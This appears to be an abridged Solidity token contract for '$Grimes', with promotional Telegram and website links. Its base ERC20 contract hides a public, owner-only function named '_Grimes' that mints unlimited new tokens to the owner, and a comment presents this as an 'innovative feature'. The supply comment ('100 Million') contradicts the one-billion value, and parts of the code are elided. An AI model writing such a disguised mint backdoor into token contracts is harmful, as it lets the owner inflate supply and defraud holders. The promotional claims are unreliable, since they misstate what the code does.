//
// $Grimes proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/GrimesBEP20
// 📱 Website ::http://grimes.io
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Grimes(uint256 amount) public onlyOwner {
 _Grimes(msg.sender, amount);
    }
    ...
    function _Grimes(address account, uint256 amount) internal virtual {
...
contract $Grimes is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Grimes", "GRIMES") {
     _Grimes(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}